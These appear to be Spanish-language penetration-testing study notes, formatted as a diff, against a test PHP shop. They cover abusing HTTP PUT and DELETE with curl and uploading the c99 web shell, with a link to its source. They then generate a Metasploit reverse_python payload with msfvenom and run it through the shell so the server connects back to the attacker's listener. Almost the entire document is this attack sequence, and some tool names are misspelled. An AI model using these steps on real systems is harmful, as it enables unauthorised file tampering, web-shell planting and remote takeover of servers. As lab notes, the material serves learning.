@@ -1,1 +1,47 @@
+++ Burp Suite
+--- Proxy
+--- Intercep on
+--- Open Browser
+
+
+++ Web Browser
+--- test php
+--- Your cart
+--- sign in, credenciales: test/test
+--- login
+
+
+++ Burp Suite
+--- Verificar la presencia de POST Request
+
+++ Web Browser
+--- curl -v -X OPTIONS <url> 
+--- Se nos mostrarán todos los métodos permitidos en la url
+--- curl -X DELETE <url>
+--- Verificar la eliminación correspondiente del archivo del url
+--- curl -X PUT -d "hacked"  <url/1.txt> ---> Crería un archivo txt y dentro se escribiría la cadena hacked
+--- curl -X PUT --upload-file c99shell.php <url> --http1.0
+---- URL c99shell: https://github.com/RootShelll/C99-Shell
+--- Dentro del servidor estará el archivo correspondiente al shell subido
+
+
+++ Kali
+--- msfconsole 
+--- use exploit/multi/handler 
+--- set payload cmd/unix/reverse_python
+--- set LHOST <ip_local>
+--- set LPORT 443
+--- abrir otra terminal
+--- msfvemom -p cmd/unix/reverse_pyhton LPORT=443 LHOST=<ip_local>
+--- Copiar comando generado
+--- volver a la terminal original
+--- run
+
+++ Web Browser
+--- Copiar el comando en el shell c99 
+--- Execute
+
+++ Kali
+--- Nos aparecerá el mensaje en la terminal original indicando que se ha abierto una nueva sesión
+
 
